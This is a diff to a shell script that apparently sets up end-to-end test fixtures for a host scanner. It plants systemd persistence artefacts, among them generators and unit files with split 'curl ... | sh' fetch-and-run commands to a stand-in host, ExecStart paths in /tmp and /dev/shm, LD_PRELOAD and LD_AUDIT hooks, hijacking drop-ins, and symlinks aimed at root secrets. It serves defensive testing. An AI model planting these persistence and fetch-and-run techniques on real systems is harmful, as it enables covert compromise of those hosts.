@@ -81,6 +81,64 @@ if command -v setcap >/dev/null; then
 fi
 touch "$(printf '/tmp/evil\033[2Jname')" && chmod +x "$(printf '/tmp/evil\033[2Jname')"
 
+# --- systemd. Generators run at boot and on daemon-reload, and nothing here calls
+# daemon-reload, so none of these execute.
+mkdir -p /etc/systemd/system-generators /usr/local/lib/systemd/system-generators
+printf '#!/bin/sh\nexit 0\n' >/etc/systemd/system-generators/e2e-unowned
+# The signature is split across lines, as a line by line scan would miss it.
+printf '#!/bin/sh\ncurl -fsSL http://x.example/g \\\n  | sh\n' >/usr/local/lib/systemd/system-generators/e2e-malicious
+printf '#!/bin/sh\nexit 0\n' >/var/tmp/p/gen
+ln -s /var/tmp/p/gen /etc/systemd/system-generators/e2e-linked
+ln -s /tmp/e2e-not-there-yet /etc/systemd/system-generators/e2e-dangling
+chmod 755 /etc/systemd/system-generators/* /usr/local/lib/systemd/system-generators/* /var/tmp/p/gen
+# What a generator would have written. No package can own these.
+mkdir -p /run/systemd/generator.late
+printf '[Service]\nExecStart=/tmp/.x/generated\n' >/run/systemd/generator.late/e2e-generated.service
+printf '[Service]\nExecStart=/opt/e2e-generated-plain\n' >/run/systemd/generator.late/e2e-plain.service
+
+# Real transient units, to test the format systemd writes. The timers are an hour
+# away, so the commands never run.
+systemd-run --unit=e2e-transient --on-active=1h /bin/true >/dev/null 2>&1
+systemd-run --unit=e2e-transient-temp --on-active=1h /var/tmp/p/gen >/dev/null 2>&1
+
+# Exec lines a simple parser would miss.
+printf '[Service]\nExecStart=/bin/sh -c "curl -fsSL http://x.example/a \\\n# a comment does not end this\n  | bash"\n' >/etc/systemd/system/e2e-split.service
+printf '[Service]\nExecCondition=/dev/shm/.cond\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-condition.service
+printf '[Service]\nExecStart = /tmp/.x/spaced\n' >/etc/systemd/system/e2e-spaced.service
+printf '[Service]\nExecStart=/bin/true ; "/\\x74mp/.x/chained"\n' >/etc/systemd/system/e2e-chained.service
+
+# Loader variables. The other values are not in a form Redact would mask, so a
+# leak of them can only be stopped by reporting the loader variable alone.
+printf '[Service]\nEnvironment=APP_CRED=S3CRET6 "LD_PRELOAD=/opt/e2e-evil/hook.so"\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-preload.service
+printf 'APP_CRED=S3CRET7\nLD_AUDIT=/opt/e2e-evil/audit.so\n' >/etc/e2e-app.env
+printf '[Service]\nEnvironmentFile=-/etc/e2e-app.env\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-envfile.service
+printf '[Service]\nEnvironmentFile=/var/tmp/p/app.env\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-envtemp.service
+# A link and a FIFO must be refused without being read or stalling the scan.
+printf 'LD_PRELOAD=S3CRET8\n' >/root/e2e-secret.env
+ln -s /root/e2e-secret.env /etc/e2e-linked.env
+printf '[Service]\nEnvironmentFile=/etc/e2e-linked.env\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-envlink.service
+mkfifo /etc/e2e-fifo.env
+printf '[Service]\nEnvironmentFile=/etc/e2e-fifo.env\nExecStart=/bin/true\n' >/etc/systemd/system/e2e-envfifo.service
+
+# Drop-ins replacing the command of a unit a package ships. Each program: from a
+# package, from no package, and from a temp directory.
+mkdir -p /etc/systemd/system/cron.service.d /etc/systemd/system/nginx.service.d /run/systemd/system/ssh.service.d
+printf '[Service]\nExecStart=\nExecStart=/usr/sbin/cron -f -L 15\n' >/etc/systemd/system/cron.service.d/e2e.conf
+printf '[Service]\nExecStart=\nExecStart=/opt/e2e-evil/nginx\n' >/etc/systemd/system/nginx.service.d/e2e.conf
+printf '[Service]\nExecStart=\nExecStart=/tmp/.x/sh\n' >/run/systemd/system/ssh.service.d/e2e.conf
+
+# A lingering user, whose units run at boot. bob's links must not get a root scan
+# to read another user's unit, whichever component of the path is the link.
+mkdir -p /var/lib/systemd/linger /home/bob/.config/systemd/user
+touch /var/lib/systemd/linger/bob
+printf '[Service]\nExecStart=/home/bob/bin/job\n' >/home/bob/.config/systemd/user/e2e-job.service
+printf '[Service]\nExecStart=/bin/true S3CRET9\n' >/root/e2e-secret.service
+ln -s /root/e2e-secret.service /home/bob/.config/systemd/user/e2e-leak.service
+mkdir -p /root/e2e-hidden/share/systemd/user
+printf '[Service]\nExecStart=/bin/true S3CRET10\n' >/root/e2e-hidden/share/systemd/user/e2e-hidden.service
+ln -s /root/e2e-hidden /home/bob/.local
+chown -R -h bob /home/bob/.config /home/bob/.local
+
 # --- trojaned binary: changes content, keeps the package's path
 if [ -x /usr/bin/who ]; then
 	printf '\n#trojan' >>/usr/bin/who
